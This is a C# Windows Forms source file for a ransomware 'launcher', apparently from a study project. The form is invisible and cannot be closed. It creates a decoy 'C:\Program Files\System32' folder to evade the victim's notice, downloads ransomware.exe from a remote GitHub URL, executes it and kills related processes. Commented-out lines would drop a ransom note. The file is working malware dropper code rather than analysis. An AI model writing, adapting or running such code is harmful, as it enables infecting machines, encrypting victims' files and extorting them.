using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace launcher
{
    public partial class launcher : Form
    {
        public launcher()
        {
            InitializeComponent();
            // Make this form transparent
            this.TransparencyKey = this.BackColor;
        }

        private void launcher_FormClosing(object sender, FormClosingEventArgs e)
        {
            // Prevent user from closing the program
            e.Cancel = true;
        }

        private void launcher_Load(object sender, EventArgs e)
        {
            // Make this form invisible by setting the size of components to zero
            this.Left = 0;
            this.Top = 0;
            this.Width = Screen.PrimaryScreen.Bounds.Width;
            this.Height = Screen.PrimaryScreen.Bounds.Height;

            // Create a new folder called System32, which is similar to 
            // the system's folder, so that making the victim harder to detect the malware.
            // This directory will be a place to store the ransomware
            Directory.CreateDirectory(@"C:\Program Files\System32");
            File.WriteAllText(@"C:\Program Files\System32\README.txt", "You found the ransomware? Congrats!!!");
            //

            // Get path to Desktop folder
            string path_desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            
            ////
            //string existfile = path_desktop + @"\.cache_RANSOMWARE.exe";
            //if (!File.Exists(existfile))
            //{    
            //    // 
            //    using (StreamWriter stream = File.CreateText(path_desktop + @"\._cache_RANSOMWARE.exe"))
            //    {
            //        stream.WriteLine("Cash on delivery bae!");
            //    }
            //}

            //
            //using(StreamWriter stream = File.CreateText(path_desktop + @"\Message_from_RANSOMWARE.txt"))
            //{
            //    stream.WriteLine("Your file has been encrypted. Cash on delivery bae!");
            //}

            // Set up security level for new connection to download the exe file of ransomware
            ServicePointManager.Expect100Continue = true;                       // Set in requests of the client to server in order to make the server clarify if everything is OK so far
            ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;  // Selects the version of the SSL or TLS protocol to use for new connections

            // Download Ransomwre from attacker server in exe format into victim machine and move it the location we created before
            WebClient wc = new WebClient();
            string path_ransomware = @"C:\Program Files\System32\ransomware.exe";
            string exe_url = "https://github.com/kobato16/ransom-study/raw/main/ransomware.exe";
            wc.DownloadFile(exe_url, path_ransomware);

            // Run the ransomware after downloading
            Process.Start(path_ransomware);

            // The launcher has done its jobs hence we are going to shut it down
            Process[] procs = null;
            procs = Process.GetProcessesByName("Note");
            foreach(Process proc in procs)
            {
                proc.Kill();
            }

            //procs = Process.GetProcessesByName("._cache_RANSOMWARE");
            //foreach(Process proc in procs)
            //{
            //    proc.Kill();
            //}
        }
    }
}
